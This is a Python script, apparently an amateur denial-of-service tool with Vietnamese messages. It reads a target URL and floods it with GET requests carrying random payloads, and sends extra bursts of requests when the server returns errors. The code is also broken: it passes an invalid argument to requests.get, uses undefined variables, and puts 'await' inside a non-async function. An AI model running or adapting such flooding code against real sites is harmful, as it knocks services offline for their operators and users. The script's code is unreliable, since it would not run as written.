import requests
import aiohttp
from urllib.parse import urlparse
import asyncio
import random
import string
import ssl

url = input("url: ")

def attack(target):
    print("Dos Get - method by Cánh Cụt Không Bay")
    headers = {
        "X-Requested-With": "XMLHttpRequest",
        "Connection": "keep-alive",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "Accept-Encoding": "gzip, deflate, br",
        "User-agent": "hello, world!!!",
    }

    def generate_random_payload():
        length = random.randint(1, 9999999)
        text_characters = string.ascii_letters + string.digits + string.punctuation
        payload = "".join(random.choice(text_characters) for i in range(length))
        return payload

    while True:
        x = requests.get(target, headers=headers, payload=generate_random_payload(), timeout=3)
        try:
            if x.status_code == 200:
                print("ok, tấn công")
                requests.get(target, payload=generate_random_payload(), timeout=10)
                session.head(target, data=aiohttp.BytesPayload(data.encode()))
                context = ssl.create_default_context()
                transport, client = await session._request(
                    method="GET",
                    url=target,
                    ssl=context,
                    data=aiohttp.BytesPayload(data.encode()),
                ).__aenter__()
                await client._writer.drain()
                await asyncio.sleep(0.1)
                transport.close()
                test = requests.get(target)
                print("testing request: ", test)
                return False
            elif x.status_code == 403:
                print("block ip !!!!")
                break
            elif x.status_code >= 500:
                print("false back!!!, attack phụ")
                requests.get(target)
                requests.get(target)
                requests.get(target)
                requests.get(target)
                requests.get(target)
                requests.get(target)
                requests.get(target)
                requests.get(target)
        except requests.exceptions.RequestException as e:
            print("Error: ", e)
            break

attack(url)
